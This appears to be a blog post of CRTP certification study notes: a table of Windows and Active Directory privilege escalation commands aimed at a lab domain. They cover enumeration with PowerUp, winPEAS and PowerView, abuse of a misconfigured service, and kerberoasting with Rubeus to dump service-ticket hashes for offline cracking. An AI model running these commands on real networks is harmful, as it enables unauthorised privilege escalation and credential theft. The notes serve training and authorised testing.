---
title: "Privilege Escalation"
date: 2025-03-27 10:08:00 +0000
categories: [Certifications Technical Notes, Certified Red Team Professional (CRTP)]
tags: [active directory attacks, offensive security]
---

| **Technique** | **Command** | **Description** |
| --- | --- | --- |
| **PowerUp Enumeration** | `. C:\AD\Tools\PowerUp.ps1; Invoke-AllChecks` | Run all privilege escalation checks using PowerUp |
| **Abuse Service (PowerUp)** | `Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose` | Exploit misconfigured service for privilege escalation |
| **winPEAS Enumeration** | `C:\AD\Tools\winPEASx64.exe notcolor log` | Run winPEAS without color output and log results |
| **PrivEscCheck Enumeration** | `. C:\AD\Tools\PrivEscCheck.ps1; Invoke-PrivescCheck` | Comprehensive privilege escalation checks |
| **Find Local Admin Access** | `Find-LocalAdminAccess -Verbose` | Discover machines where current user has local admin rights (PowerView) |
| **Find PSRemoting Admin Access** | `Find-PSRemotingLocalAdminAccess` | Find machines accessible via PowerShell Remoting with admin rights |
| **Find Domain Admin Sessions** | `Find-DomainUserLocation -Verbose` | Locate domain computers with domain admin sessions (PowerView) |
| **Find Sessions (NetSession)** | `Get-NetSession -ComputerName dcorp-dc -Verbose` | Enumerate active sessions on target computer (PowerView) |
| **Session Hunter** | `. C:\AD\Tools\Invoke-SessionHunter.ps1 ; Invoke-SessionHunter -NoPortScan -Targets target.txt` | Hunt for active user sessions across multiple targets |
| **Kerberoast (RC4OPSEC)** | `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt` | Extract Kerberos service tickets for offline cracking (Rubeus) |
